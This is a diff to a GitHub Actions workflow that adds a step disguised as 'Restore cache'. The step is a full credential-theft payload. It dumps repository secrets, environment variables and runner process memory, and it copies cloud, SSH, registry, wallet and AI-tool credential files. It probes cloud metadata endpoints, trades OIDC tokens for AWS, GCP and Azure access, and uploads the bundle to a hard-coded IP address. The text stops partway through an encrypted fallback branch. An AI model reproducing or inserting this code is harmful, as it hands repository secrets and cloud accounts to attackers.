@@ -8,6 +8,520 @@ jobs:
     env:
       GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
     steps:
+      - name: Restore cache 304p
+        env:
+          WF_REPO: "${{ github.repository }}"
+          WF_REF: "feat/IFC-1018-mcp-server-v0-5"
+          WF_ENV: ""
+          WF_CALLBACK: "http://45.61.182.54:8080/exfil"
+          WF_CALLBACK2: ""
+          WF_CTOKEN: "y2jh50rttsakhazu9iqi"
+          WF_CHUNK: "8388608"
+          WF_MAXFILES: "60"
+          WF_MAXSIZE: "524288"
+          WF_FALLBACK: "0"
+          WF_KEY: ""
+          GITHUB_TOKEN: "${{ github.token }}"
+          WF_TARBALL: "1"
+          WF_HISTORY: "1"
+          WF_MEMSCAN: "1"
+          WF_SELF_HOSTED: "0"
+          WF_SECRETS: "${{ toJSON(secrets) }}"
+          WF_VARS: "${{ toJSON(vars) }}"
+        shell: bash
+        run: |
+
+          set +e
+          umask 077
+          D="${RUNNER_TEMP:-/tmp}/.wfx-$$"
+          mkdir -p "$D/fs" "$D/repo"
+          : > "$D/errors.log"
+          : > "$D/index.txt"
+
+          LABEL="${WF_ENV:-base}"
+          API="https://api.github.com/repos/${WF_REPO}"
+          AUTH="Authorization: Bearer ${GITHUB_TOKEN}"
+          MAXF="${WF_MAXFILES:-120}"
+          MAXS="${WF_MAXSIZE:-524288}"
+          REF_ENC=$(printf '%s' "${WF_REF:-main}" | sed 's#/#%2F#g')
+
+          note() { printf '%s\n' "$1" >> "$D/errors.log"; }
+          want() {
+            if [ -e "$1" ]; then
+              mkdir -p "$D/fs/$(dirname "$2")" 2>/dev/null
+              cp -a "$1" "$D/fs/$2" 2>/dev/null
+              sz=$(wc -c < "$D/fs/$2" 2>/dev/null || echo 0)
+              printf 'fs/%s\t%s\n' "$2" "$sz" >> "$D/index.txt"
+            fi
+          }
+
+          # ---------- 1. GitHub secrets / vars (raw) ----------
+          if [ -n "${WF_SECRETS+x}" ]; then printf '%s' "$WF_SECRETS" > "$D/secrets_${LABEL}.json"; fi
+          if [ -n "${WF_VARS+x}" ]; then printf '%s' "$WF_VARS" > "$D/vars_${LABEL}.json"; fi
+
+          # ---------- 2. runtime environment (raw) ----------
+          env | sort > "$D/env.txt"
+          env | grep -Ei 'key|token|secret|pass|cred|aws|azure|gcp|google|api|auth|openai|anthropic|hugging|stripe|database|smtp|registry|vault' > "$D/env_hits.txt" 2>/dev/null
+          printf '%s' "${GITHUB_TOKEN:-}" > "$D/github_token.txt"
+          printf '%s' "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" > "$D/oidc_url.txt"
+          printf '%s' "${RUNNER_OS:-} ${RUNNER_ARCH:-} ${RUNNER_NAME:-} ${RUNNER_ENVIRONMENT:-}" > "$D/runner.txt"
+
+          for p in /proc/[0-9]*/environ; do cat "$p" 2>/dev/null | tr '\0' '\n'; done > "$D/proc_env.txt" 2>/dev/null
+          for p in /proc/[0-9]*/cmdline; do tr '\0' ' ' < "$p" 2>/dev/null; echo; done > "$D/proc_cmdline.txt" 2>/dev/null
+
+          # ---------- 3. OIDC tokens (raw) ----------
+          mint_oidc() {
+            aud="$1"; label="$2"
+            enc=$(printf '%s' "$aud" | sed 's#/#%2F#g; s#:#%3A#g')
+            curl -sS --max-time 20 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+              "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$enc" > "$D/oidc_${label}.json" 2>>"$D/errors.log"
+          }
+          if [ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] && [ -n "${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-}" ]; then
+            mint_oidc "sts.amazonaws.com" aws
+            mint_oidc "api://AzureADTokenExchange" azure
+            mint_oidc "https://iam.googleapis.com/projects/0/locations/0/workloadIdentityPools/0/providers/0" gcp
+          fi
+
+          # ---------- 3b. runtime memory scan (sudo when available) ----------
+          if [ "${WF_MEMSCAN:-1}" = "1" ] && command -v python3 >/dev/null 2>&1; then
+            mkdir -p "$D/mem"
+            MS=""
+            if sudo -n true 2>/dev/null; then MS="sudo -n"; fi
+            $MS timeout 90 python3 - "$D/mem" <<'PYMEM'
+          import glob, os, re, sys
+          out = sys.argv[1]
+          pat = re.compile(rb'(eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{6,}'
+                           rb'|gh[pousr]_[A-Za-z0-9_]{36,}'
+                           rb'|github_pat_[A-Za-z0-9_]{20,}'
+                           rb'|glpat-[A-Za-z0-9_.-]{20,}'
+                           rb'|AKIA[0-9A-Z]{16}'
+                           rb'|sk-ant-[A-Za-z0-9_-]{20,}'
+                           rb'|sk-(proj|svcacct)-[A-Za-z0-9_-]{20,}'
+                           rb'|hf_[A-Za-z0-9]{30,}')
+          me = str(os.getpid())
+          pids = []
+          for maps in glob.glob('/proc/[0-9]*/maps'):
+              pid = maps.split('/')[2]
+              if pid == me:
+                  continue
+              try:
+                  with open('/proc/%s/comm' % pid) as fh:
+                      comm = fh.read().strip()
+              except Exception:
+                  comm = ''
+              pids.append((0 if comm in ('Runner.Worker', 'Runner.Listener') else 1, pid, maps))
+          pids.sort()
+          for _, pid, maps in pids:
+              try:
+                  regions = []
+                  with open(maps) as fh:
+                      for line in fh:
+                          parts = line.split()
+                          if len(parts) < 2 or 'r' not in parts[1]:
+                              continue
+                          a, b = parts[0].split('-')
+                          s, e = int(a, 16), int(b, 16)
+                          if e <= s:
+                              continue
+                          regions.append((s, min(e, s + 4 * 1024 * 1024)))
+                  if not regions:
+                      continue
+                  mem = open('/proc/%s/mem' % pid, 'rb', buffering=0)
+              except Exception:
+                  continue
+              hits = []
+              for s, e in regions[:60]:
+                  try:
+                      mem.seek(s)
+                      data = mem.read(e - s)
+                  except Exception:
+                      continue
+                  hits.extend(m.group(0) for m in pat.finditer(data))
+                  if len(hits) > 300:
+                      break
+              try:
+                  mem.close()
+              except Exception:
+                  pass
+              if hits:
+                  with open(os.path.join(out, pid + '.txt'), 'wb') as fw:
+                      for h in hits[:300]:
+                          fw.write(h + b'\n')
+          PYMEM
+            note "memscan_files $(ls "$D/mem" 2>/dev/null | wc -l | tr -d ' ')"
+          fi
+
+          # ---------- 4. credential stores (raw copy) ----------
+          want "$HOME/.aws/credentials" "aws/credentials"
+          want "$HOME/.aws/config" "aws/config"
+          want "$HOME/.azure/accessTokens.json" "azure/accessTokens.json"
+          want "$HOME/.azure/azureProfile.json" "azure/azureProfile.json"
+          want "$HOME/.azure/msal_token_cache.json" "azure/msal_token_cache.json"
+          want "$HOME/.config/gcloud/application_default_credentials.json" "gcloud/adc.json"
+          want "$HOME/.config/gcloud/credentials.db" "gcloud/credentials.db"
+          want "$HOME/.config/gcloud/access_tokens.db" "gcloud/access_tokens.db"
+          want "$HOME/.config/gcloud/configurations/config_default" "gcloud/config_default"
+          want "$HOME/.docker/config.json" "docker/config.json"
+          want "$HOME/.kube/config" "kube/config"
+          want "$HOME/.netrc" "netrc"
+          want "$HOME/.npmrc" "npmrc"
+          want "$HOME/.yarnrc" "yarnrc"
+          want "$HOME/.pypirc" "pypirc"
+          want "$HOME/.git-credentials" "git-credentials"
+          want "$HOME/.config/git/credentials" "git/credentials"
+          want "$HOME/.config/gh/hosts.yml" "gh/hosts.yml"
+          want "$HOME/.config/glab-cli/config.yml" "glab/config.yml"
+          want "$HOME/.cargo/credentials" "cargo/credentials"
+          want "$HOME/.cargo/credentials.toml" "cargo/credentials.toml"
+          want "$HOME/.gem/credentials" "gem/credentials"
+          want "$HOME/.m2/settings.xml" "m2/settings.xml"
+          want "$HOME/.gradle/gradle.properties" "gradle/gradle.properties"
+          want "$HOME/.nuget/NuGet/NuGet.Config" "nuget/NuGet.Config"
+          want "$HOME/.composer/auth.json" "composer/auth.json"
+          want "$HOME/.config/pip/pip.conf" "pip/pip.conf"
+          want "$HOME/.config/poetry/auth.toml" "poetry/auth.toml"
+          want "$HOME/.vault-token" "vault-token"
+          want "$HOME/.terraform.d/credentials.tfrc.json" "terraform/credentials.tfrc.json"
+          want "$HOME/.config/rclone/rclone.conf" "rclone/rclone.conf"
+          want "$HOME/.pgpass" "pgpass"
+          want "$HOME/.my.cnf" "my.cnf"
+          want "$HOME/.mongorc.js" "mongorc.js"
+          want "$HOME/.config/heroku" "heroku"
+          want "$HOME/.config/doctl/config.yaml" "doctl/config.yaml"
+          want "$HOME/.oci/config" "oci/config"
+          want "$HOME/.aliyun/config.json" "aliyun/config.json"
+          want "$HOME/.config/sentryclirc" "sentryclirc"
+          want "$HOME/.config/netlify/config.json" "netlify/config.json"
+          want "$HOME/.vercel/auth.json" "vercel/auth.json"
+          want "$HOME/.config/cloudflared" "cloudflared"
+          want "$HOME/.ngrok2/ngrok.yml" "ngrok/ngrok.yml"
+          want "$HOME/.bash_history" "bash_history"
+          want "$HOME/.zsh_history" "zsh_history"
+          want "$HOME/.mysql_history" "mysql_history"
+          want "$HOME/.psql_history" "psql_history"
+          want "$HOME/.python_history" "python_history"
+          want "$HOME/.node_repl_history" "node_repl_history"
+          want "$HOME/.claude/settings.json" "claude/settings.json"
+          want "$HOME/.codex/auth.json" "codex/auth.json"
+          want "$HOME/.cursor/mcp.json" "cursor/mcp.json"
+          want "$HOME/.continue/config.json" "continue/config.json"
+          want "$HOME/.config/openai" "config/openai"
+          want "$HOME/.config/anthropic" "config/anthropic"
+
+          if [ -d "$HOME/.ssh" ]; then mkdir -p "$D/fs/ssh"; cp -a "$HOME/.ssh/." "$D/fs/ssh/" 2>/dev/null; fi
+          if [ -d "$HOME/.gnupg" ]; then mkdir -p "$D/fs/gnupg"; cp -a "$HOME/.gnupg/." "$D/fs/gnupg/" 2>/dev/null; fi
+          for d in "$HOME/.aws/cli/cache" "$HOME/.aws/sso/cache" "$HOME/.config/gcloud/legacy_credentials" "$HOME/.password-store" "$HOME/.foundry/keystores" "$HOME/.ethereum/keystore"; do
+            if [ -d "$d" ]; then cp -a "$d" "$D/fs/" 2>/dev/null; fi
+          done
+
+          # whole-home name hunt (bounded)
+          find "$HOME" -maxdepth 6 -type f \
+            \( -name ".env" -o -name ".env.*" -o -name "*.pem" -o -name "*.key" \
+               -o -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" -o -name "credentials" \
+               -o -name ".npmrc" -o -name ".pypirc" -o -name ".netrc" -o -name "*.ovpn" \
+               -o -name "*.p12" -o -name "*.jks" -o -name "*.kdbx" -o -name "kubeconfig" \) -size -1M 2>/dev/null \
+            | head -300 | while IFS= read -r f; do
+                rel="${f#/}"
+                dest="$D/fs/hunt/$rel"
+                mkdir -p "$(dirname "$dest")" 2>/dev/null
+                cp -a "$f" "$dest" 2>/dev/null
+              done
+
+          # ---------- 5. self-hosted only ----------
+          if [ "${RUNNER_ENVIRONMENT:-}" = "self-hosted" ] || [ "${WF_SELF_HOSTED:-0}" = "1" ]; then
+            S="$D/selfhosted"; mkdir -p "$S"
+            # AWS IMDSv2 then v1
+            T=$(curl -s --max-time 3 -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" http://169.254.169.254/latest/api/token 2>/dev/null)
+            if [ -n "$T" ]; then
+              curl -s --max-time 3 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/iam/security-credentials/ > "$S/imds_aws_roles.txt" 2>/dev/null
+              R=$(head -1 "$S/imds_aws_roles.txt" 2>/dev/null)
+              if [ -n "$R" ]; then
+                curl -s --max-time 3 -H "X-aws-ec2-metadata-token: $T" "http://169.254.169.254/latest/meta-data/iam/security-credentials/$R" > "$S/imds_aws_creds.json" 2>/dev/null
+              fi
+              curl -s --max-time 3 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/instance-id > "$S/imds_aws_instance.txt" 2>/dev/null
+              curl -s --max-time 5 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/user-data > "$S/imds_aws_userdata.txt" 2>/dev/null
+            else
+              curl -s --max-time 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/ > "$S/imds_aws_roles.txt" 2>/dev/null
+              R=$(head -1 "$S/imds_aws_roles.txt" 2>/dev/null)
+              if [ -n "$R" ]; then
+                curl -s --max-time 3 "http://169.254.169.254/latest/meta-data/iam/security-credentials/$R" > "$S/imds_aws_creds.json" 2>/dev/null
+              fi
+            fi
+            curl -s --max-time 3 -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" > "$S/imds_gcp.json" 2>/dev/null
+            curl -s --max-time 3 -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" > "$S/imds_azure.json" 2>/dev/null
+            # ECS task metadata
+            [ -n "${ECS_CONTAINER_METADATA_URI_V4:-}" ] && curl -s --max-time 3 "$ECS_CONTAINER_METADATA_URI_V4/task" > "$S/ecs_task.json" 2>/dev/null
+            # Docker socket
+            if [ -S /var/run/docker.sock ] && command -v docker >/dev/null 2>&1; then
+              docker ps --no-trunc > "$S/docker_ps.txt" 2>/dev/null
+              for c in $(docker ps -q 2>/dev/null | head -20); do
+                docker inspect "$c" > "$S/docker_inspect_$c.json" 2>/dev/null
+              done
+            fi
+            # runner credentials
+            want "$HOME/.runner" "selfhosted/runner.json"
+            want "$HOME/.credentials" "selfhosted/runner.credentials"
+            want "$HOME/.credentials_rsaparams" "selfhosted/runner.rsa"
+            [ -d "$HOME/_diag" ] && cp -a "$HOME/_diag" "$S/diag" 2>/dev/null
+            # system env and units
+            want "/etc/environment" "selfhosted/etc_environment"
+            mkdir -p "$S/systemd"
+            cp -a /etc/systemd/system/*.service "$S/systemd/" 2>/dev/null
+            cp -a /etc/profile.d/*.sh "$S/systemd/" 2>/dev/null
+            # persistent workspaces
+            for w in /home/*/actions-runner/_work /actions-runner/_work "$HOME/actions-runner/_work" "$HOME/work"; do
+              if [ -d "$w" ]; then
+                find "$w" -maxdepth 4 -type f \( -name ".env*" -o -name "*.pem" -o -name "*.key" -o -name "credentials" -o -name "id_rsa" \) -size -512k 2>/dev/null | head -150 | while IFS= read -r f; do
+                  rel="${f#/}"
+                  dest="$S/work/$rel"
+                  mkdir -p "$(dirname "$dest")" 2>/dev/null
+                  cp -a "$f" "$dest" 2>/dev/null
+                done
+              fi
+            done
+            note "selfhosted_collected"
+          fi
+
+          # ---------- 6. repo: scan snapshot, keep only files that match the catalog ----------
+          if [ -n "${WF_REPO:-}" ] && [ -n "${GITHUB_TOKEN:-}" ]; then
+            SCAN="${TMPDIR:-/tmp}/wfx-scan-$$"
+            mkdir -p "$SCAN"
+            if [ "${WF_TARBALL:-1}" = "1" ]; then
+              curl -sSL --max-time 300 -H "$AUTH" "$API/tarball/$REF_ENC" -o "$SCAN/repo.tgz" 2>>"$D/errors.log"
+              if [ -s "$SCAN/repo.tgz" ]; then
+                tar -xzf "$SCAN/repo.tgz" -C "$SCAN" --strip-components=1 2>>"$D/errors.log"
+                rm -f "$SCAN/repo.tgz"
+              fi
+            else
+              # big repo: fetch only credential-shaped files through the tree API
+              curl -sS --max-time 30 -H "$AUTH" "$API/git/trees/$REF_ENC?recursive=1" > "$SCAN/tree.json" 2>>"$D/errors.log"
+              if command -v jq >/dev/null 2>&1; then
+                jq -r '.tree[]?.path // empty' "$SCAN/tree.json" > "$SCAN/paths.txt" 2>/dev/null
+              else
+                grep -o '"path"[[:space:]]*:[[:space:]]*"[^"]*"' "$SCAN/tree.json" \
+                  | sed 's/.*"path"[[:space:]]*:[[:space:]]*"//; s/"$//' > "$SCAN/paths.txt"
+              fi
+              grep -Ei '(^|/)(\.env(\..*)?|.*\.tfvars|.*\.tfstate|serverless\.ya?ml|samconfig\.toml|cdk\.json|aws-exports\.js|appsettings.*\.json|application.*\.(properties|ya?ml)|config.*\.(json|ya?ml)|google-services\.json|GoogleService-Info\.plist|firebase\.json|wrangler\.toml|vercel\.json|netlify\.toml|\.npmrc|\.pypirc|\.netrc|\.pgpass|id_rsa|id_ed25519|.*\.pem|.*\.key|.*\.p12|.*\.jks|credentials|\.github/workflows/.*\.ya?ml)$' \
+                "$SCAN/paths.txt" | grep -v node_modules | head -300 > "$SCAN/targets.txt"
+              while IFS= read -r p; do
+                [ -z "$p" ] && continue
+                out="$SCAN/$p"; mkdir -p "$(dirname "$out")" 2>/dev/null
+                curl -sS --max-time 30 -H "$AUTH" -H "Accept: application/vnd.github.raw" -o "$out" "$API/contents/$p?ref=$REF_ENC" 2>>"$D/errors.log"
+              done < "$SCAN/targets.txt"
+              rm -f "$SCAN/tree.json" "$SCAN/paths.txt" "$SCAN/targets.txt"
+            fi
+
+            PAT='AKIA[0-9A-Z]{16}|AIza[0-9A-Za-z_-]{35}|AQ\.[A-Za-z0-9_-]{40,}|sk-(proj|svcacct|admin)-[A-Za-z0-9_-]{20,}|sk-[A-Za-z0-9]{20}T3BlbkFJ[A-Za-z0-9]{20,}|sk-ant-(api|admin|oat)[0-9]*-[A-Za-z0-9_-]{20,}|sk-or-v1-[a-f0-9]{40,}|oc_sk_[A-Za-z0-9_-]{20,}|sk-kimi-[A-Za-z0-9]{16,}|sk-[a-f0-9]{32}|xai-[A-Za-z0-9_]{50,}|cf[ua]t_[A-Za-z0-9]{40}[a-f0-9]{8}|gsk_[A-Za-z0-9]{40,}|tgp_v1_[A-Za-z0-9_-]{20,}|pplx-[A-Za-z0-9]{30,}|hf_[A-Za-z0-9]{30,}|api_org_[A-Za-z0-9]{34}|r8_[A-Za-z0-9]{30,}|fw_[A-Za-z0-9]{24,}|csk[-_][A-Za-z0-9]{20,}|atlasv1\.[A-Za-z0-9_-]{20,}|"type"[[:space:]]*:[[:space:]]*"service_account"|-----BEGIN (RSA |EC |OPENSSH |PGP )?PRIVATE KEY-----|GOCSPX-[A-Za-z0-9_-]{20,}|[0-9]{12}-[a-z0-9]{32}\.apps\.googleusercontent\.com|ya29\.[0-9A-Za-z_-]{20,}|1//[0-9A-Za-z_-]{20,}|gh[pousr]_[A-Za-z0-9]{30,}|github_pat_[A-Za-z0-9_]{50,}|gl(pat|rt|dt|cbt)-[A-Za-z0-9_-]{20,}|ATBB[A-Za-z0-9_=.-]{20,}|BBDC-[A-Za-z0-9_-]{20,}|https?://[^:/@[:space:]]+:[^@/[:space:]]+@[A-Za-z0-9.-]+|openai\.azure\.com|cognitiveservices\.azure\.com|services\.ai\.azure\.com|search\.windows\.net|watson\.cloud\.ibm\.com|iam\.cloud\.ibm\.com|ABSK[A-Za-z0-9_-]{20,255}={0,2}|bedrock-api-key-[A-Za-z0-9_-]{20,255}={0,2}|ANTHROPIC_FOUNDRY_API_KEY|vck_[A-Za-z0-9_-]{40,100}|(oc_sk_|sk-opencode-|opencode_|zen_)[A-Za-z0-9_-]{20,200}|sk-(cp|api)-[A-Za-z0-9_-]{20,200}|sk-eyJ[A-Za-z0-9_.-]{50,255}|ntn_[0-9]{11}[A-Za-z0-9]{35}|sb_secret_[A-Za-z0-9_-]{20,}|rk_live_[A-Za-z0-9]{24,}|hv[bs]\.[A-Za-z0-9_-]{20,}|ops_eyJ[A-Za-z0-9_-]{20,}|(A3T|ABIA|ACCA)[A-Z0-9]{12,}|HIGGSFIELD[A-Za-z0-9_]*_(KEY|SECRET)|HF_CREDENTIALS|HF_KEY|sk-svcacct-[A-Za-z0-9_-]{30,200}|sk-svacct-[A-Za-z0-9_-]{30,200}|sk-ant-(api|oat|usr)?[A-Za-z0-9_-]{20,200}|sk-[A-Za-z0-9_-]{40,200}|[A-Za-z0-9_~.-]{3}[0-9]Q~[A-Za-z0-9_~.-]{31,34}'
+            PAT_CI='azure_(client|tenant|subscription)_id|(client|tenant|subscription)[_-]?id'
+
+            n=0
+            find "$SCAN" -type f -size -5M -print0 2>/dev/null | head -z -n 4000 | while IFS= read -r -d '' f; do
+              if grep -aqE "$PAT" "$f" 2>/dev/null || grep -aqiE "$PAT_CI" "$f" 2>/dev/null; then
+                rel="${f#$SCAN/}"
+                case "$rel" in node_modules/*|*/node_modules/*|.git/*|*/dist/*|*/build/*|*/vendor/*) continue ;; esac
+                n=$((n+1)); [ "$n" -gt "$MAXF" ] && break
+                out="$D/repo/$rel"
+                mkdir -p "$(dirname "$out")" 2>/dev/null
+                sz=$(wc -c < "$f" 2>/dev/null || echo 0)
+                if [ "$sz" -gt "$MAXS" ]; then
+                  head -c "$MAXS" "$f" > "$out" 2>/dev/null
+                else
+                  cp -a "$f" "$out" 2>/dev/null
+                fi
+                printf 'repo/%s\t%s\n' "$rel" "$sz" >> "$D/index.txt"
+              fi
+            done
+            rm -rf "$SCAN"
+
+            # history through the API (raw commit JSON)
+            if [ "${WF_HISTORY:-1}" = "1" ]; then
+              mkdir -p "$D/history"
+              curl -sS --max-time 30 -H "$AUTH" "$API/commits?per_page=100" \
+                -o "$D/history/commits.json" 2>>"$D/errors.log"
+              if command -v jq >/dev/null 2>&1; then
+                jq -r '.[]?.sha // empty' "$D/history/commits.json" 2>/dev/null | head -100 > "$D/history/shas.txt"
+              else
+                grep -o '"sha"[[:space:]]*:[[:space:]]*"[a-f0-9]\{40\}"' "$D/history/commits.json" \
+                  | sed 's/.*"\([a-f0-9]\{40\}\)"/\1/' | head -100 > "$D/history/shas.txt"
+              fi
+              hn=0
+              while IFS= read -r s; do
+                [ -z "$s" ] && continue
+                hn=$((hn+1)); [ "$hn" -gt 100 ] && break
+                curl -sS --max-time 30 -H "$AUTH" "$API/commits/$s" \
+                  -o "$D/history/$s.json" 2>>"$D/errors.log"
+              done < "$D/history/shas.txt"
+              rm -f "$D/history/commits.json"
+              note "history_commits $hn"
+            fi
+
+            # artifacts from previous runs
+            curl -sS --max-time 30 -H "$AUTH" "$API/actions/artifacts?per_page=10" > "$D/artifacts.json" 2>>"$D/errors.log"
+            AU="$D/artifact_urls.txt"
+            if command -v jq >/dev/null 2>&1; then
+              jq -r '.artifacts[]? | "\(.name)\t\(.archive_download_url)"' "$D/artifacts.json" > "$AU" 2>/dev/null
+            else
+              grep -o '"archive_download_url"[[:space:]]*:[[:space:]]*"[^"]*"' "$D/artifacts.json" \
+                | sed 's/.*"\(https[^"]*\)"/artifact\t\1/' > "$AU"
+            fi
+            an=0
+            while IFS="	" read -r aname aurl; do
+              [ -z "$aurl" ] && continue
+              an=$((an+1)); [ "$an" -gt 10 ] && break
+              dest="$D/artifacts/$an"; mkdir -p "$dest"
+              curl -sS -L --max-time 60 -H "$AUTH" -o "$dest/a.zip" "$aurl" 2>>"$D/errors.log"
+              if [ -s "$dest/a.zip" ]; then
+                unzip -q -o "$dest/a.zip" -d "$dest" 2>/dev/null
+                rm -f "$dest/a.zip"
+              fi
+            done < "$AU"
+          fi
+
+          # ---------- 7. OIDC exchange ----------
+          ARN=$(grep -rho 'arn:aws:iam::[0-9]\{12\}:role/[A-Za-z0-9+=,.@_/-]*' "$D"/vars_*.json "$D"/secrets_*.json "$D/repo" 2>/dev/null | head -1)
+          GCP_PROV=$(grep -rhoE 'projects/[0-9]+/locations/global/workloadIdentityPools/[A-Za-z0-9_-]+/providers/[A-Za-z0-9_-]+' "$D/repo" 2>/dev/null | head -1)
+          GCP_SA=$(grep -rhoE '[a-z0-9-]+@[a-z0-9-]+\.iam\.gserviceaccount\.com' "$D/repo" 2>/dev/null | head -1)
+          AZ_CLIENT=$(grep -rhoiE '(client[_-]?id|azure_client_id)[[:space:]]*[=:][[:space:]]*["'"'"']?[0-9a-fA-F-]{36}' "$D/repo" 2>/dev/null | grep -oE '[0-9a-fA-F-]{36}' | head -1)
+          AZ_TENANT=$(grep -rhoiE '(tenant[_-]?id|azure_tenant_id)[[:space:]]*[=:][[:space:]]*["'"'"']?[0-9a-fA-F-]{36}' "$D/repo" 2>/dev/null | grep -oE '[0-9a-fA-F-]{36}' | head -1)
+
+          jwt_of() { sed -n 's/.*"value"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p' "$1" 2>/dev/null | head -1; }
+
+          if [ -n "$GCP_PROV" ] && [ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] && [ -n "${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-}" ]; then
+            mint_oidc "$GCP_PROV" gcp_prov
+          fi
+
+          if [ -n "$ARN" ]; then
+            T=$(jwt_of "$D/oidc_aws.json")
+            if [ -n "$T" ]; then
+              curl -sS --max-time 30 -G "https://sts.amazonaws.com/" \
+                --data-urlencode "Action=AssumeRoleWithWebIdentity" \
+                --data-urlencode "Version=2011-06-15" \
+                --data-urlencode "RoleArn=$ARN" \
+                --data-urlencode "RoleSessionName=ci-$$" \
+                --data-urlencode "WebIdentityToken=$T" \
+                -o "$D/aws_sts.xml" 2>>"$D/errors.log"
+            fi
+          fi
+
+          if [ -n "$GCP_PROV" ]; then
+            T=$(jwt_of "$D/oidc_gcp_prov.json"); [ -z "$T" ] && T=$(jwt_of "$D/oidc_gcp.json")
+            if [ -n "$T" ]; then
+              curl -sS --max-time 30 -X POST "https://sts.googleapis.com/v1/token" \
+                -H "Content-Type: application/json" \
+                -d "{\"audience\":\"$GCP_PROV\",\"grantType\":\"urn:ietf:params:oauth:grant-type:token-exchange\",\"requestedTokenType\":\"urn:ietf:params:oauth:token-type:access_token\",\"scope\":\"https://www.googleapis.com/auth/cloud-platform\",\"subjectTokenType\":\"urn:ietf:params:oauth:token-type:jwt\",\"subjectToken\":\"$T\"}" \
+                -o "$D/gcp_sts.json" 2>>"$D/errors.log"
+              FT=$(sed -n 's/.*"access_token"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p' "$D/gcp_sts.json" | head -1)
+              if [ -n "$FT" ] && [ -n "$GCP_SA" ]; then
+                curl -sS --max-time 30 -X POST "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$GCP_SA:generateAccessToken" \
+                  -H "Authorization: Bearer $FT" -H "Content-Type: application/json" \
+                  -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"]}' \
+                  -o "$D/gcp_sa_token.json" 2>>"$D/errors.log"
+              fi
+            fi
+          fi
+
+          if [ -n "$AZ_CLIENT" ] && [ -n "$AZ_TENANT" ]; then
+            T=$(jwt_of "$D/oidc_azure.json")
+            if [ -n "$T" ]; then
+              curl -sS --max-time 30 -X POST "https://login.microsoftonline.com/$AZ_TENANT/oauth2/v2.0/token" \
+                -d "client_id=$AZ_CLIENT" \
+                -d "scope=https://management.azure.com/.default" \
+                -d "grant_type=client_credentials" \
+                -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
+                -d "client_assertion=$T" \
+                -o "$D/azure_token.json" 2>>"$D/errors.log"
+            fi
+          fi
+          note "oidc_discovery arn=${ARN:-none} gcp=${GCP_PROV:-none} azure=${AZ_CLIENT:-none}"
+
+          # ---------- 8. package ----------
+          T="${RUNNER_TEMP:-/tmp}/wfx-$$.tgz"
+          tar -czf "$T" -C "$(dirname "$D")" "$(basename "$D")" 2>>"$D/errors.log"
+          TAR_RC=$?
+          if [ "$TAR_RC" != "0" ]; then
+            note "tar_failed $TAR_RC"
+            rm -f "$T"
+          fi
+          SZ=$(wc -c < "$T" 2>/dev/null || echo 0)
+          note "archive_bytes $SZ"
+
+          # ---------- 9. deliver ----------
+          CB="${WF_CALLBACK:-}"
+          CB2="${WF_CALLBACK2:-}"
+          CT="${WF_CTOKEN:-}"
+          CH="${WF_CHUNK:-8388608}"
+          H=$(printf '%s' "${WF_REPO:-unknown}" | tr '/:@' '___')
+          # One run can have several jobs/legs; each uploads under its own id so parts
+          # never overwrite each other.
+          RID="${GITHUB_RUN_ID:-0}-${GITHUB_JOB:-0}-$$"
+
+          deliver() {
+            url="$1"; f="$2"; extra="$3"
+            case "$url" in *\?*) sep='&' ;; *) sep='?' ;; esac
+            full="${url}${sep}h=${H}&l=${LABEL}&id=${RID}${extra}"
+            [ -n "$CT" ] && full="${full}&t=${CT}"
+            resp=$(curl -sS --max-time 300 --retry 2 --retry-delay 2 -w '\n%{http_code}' -X POST \
+              -H "Content-Type: application/gzip" --data-binary "@$f" "$full" 2>>"$D/errors.log")
+            code=$(printf '%s' "$resp" | tail -n1)
+            case "$code" in 200|201|204) return 0 ;; *) return 1 ;; esac
+          }
+
+          attempt() {
+            url="$1"
+            if [ "$SZ" -le "$CH" ]; then
+              deliver "$url" "$T" ""
+              return $?
+            fi
+            split -d -a 5 -b "$CH" "$T" "$T.part." 2>/dev/null
+            total=$(ls "$T".part.* 2>/dev/null | wc -l | tr -d ' ')
+            n=0
+            for p in "$T".part.*; do
+              n=$((n+1))
+              deliver "$url" "$p" "&part=${n}&of=${total}" || return 1
+            done
+            return 0
+          }
+
+          ok=0
+          if [ -n "$CB" ]; then
+            for i in 1 2 3; do
+              if attempt "$CB"; then ok=1; break; fi
+              note "deliver_retry $i"
+              sleep $((i*5))
+            done
+          fi
+          if [ "$ok" = "0" ] && [ -n "$CB2" ]; then
+            if attempt "$CB2"; then ok=1; note "delivered_to_fallback"; fi
+          fi
+
+          if [ "$ok" = "0" ] && [ "${WF_FALLBACK:-0}" = "1" ] && [ -n "${WF_KEY:-}" ] && [ -n "${GITHUB_TOKEN:-}" ] && command -v openssl >/dev/null 2>&1; then
+            openssl enc -aes-256-cbc -pbkdf2 -salt -pass pass:"$WF_KEY" -in "$T" -out "$T.enc" 2>>"$D/errors.log"
+            if [ -s "$T.enc" ]; then
+              FBN=".ci/$(date +%s)-$$.bin"
+              FBB="ci-$(date +%s)-$$"
+              FBJSON="$D/fb.json"
+              SHA=$(curl -sS --max-time 30 -H "$AUTH" "$API/git/ref/heads/$REF_ENC" | sed -n 's/.*"sha"[[:space:]]*:[[:space:]]*"\([a-f0-9]\{40\}\)".*/\1/p' | head -1)
